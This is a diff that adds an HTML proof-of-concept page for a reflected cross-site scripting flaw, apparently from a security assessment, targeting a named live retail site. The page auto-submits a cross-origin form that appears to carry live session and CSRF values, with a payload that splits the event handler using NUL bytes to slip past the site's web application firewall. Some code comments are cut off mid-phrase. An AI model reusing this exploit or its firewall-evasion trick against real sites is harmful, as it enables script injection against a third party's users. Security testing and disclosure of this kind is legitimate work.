@@ -1,0 +1,29 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>FND-014 PoC</title></head>
+<body style="font:14px system-ui,sans-serif;margin:40px">
+
+<h3>FND-014 — unauthenticated reflected XSS on www.watsons.ua</h3>
+<p>Auto-submitting a cross-origin POST to <code>www.watsons.ua</code>…</p>
+<p>Expected: the tab title becomes <b>XSSPOC-www.watsons.ua</b></p>
+
+<form id="f" method="POST"
+      action="https://www.watsons.ua/uk/stockAnonymousNotification;jsessionid=F83CB5CFF9345B52BA8E32AD87E4567F.prdwtcuacom08">
+  <input type="hidden" name="_csrf" value="02748cfd-8140-41cc-b8fc-c32d90e0f7fd">
+  <input type="hidden" name="varCode" id="v">
+</form>
+
+<script>
+// Four NUL bytes split Akamai's signature matching (on\
+// Tomcat strips them before the app renders, so the browser receives clean markup.
+// alert()/print()/confirm()/prompt() are name-listed at the
+// execution proof that passes.
+var N = String.fromCharCode(0);
+document.getElementById('v').value =
+  'A"' + N + '><details open on' + N + 'toggle="docu' + N +
+  "ment.title='XSSPOC-'+docu" + N +
+  "ment.domain;(new Image).src='/uk/xsspoc-fnd014'\">";
+document.getElementById('f').submit();
+</script>
+
+</body></html>
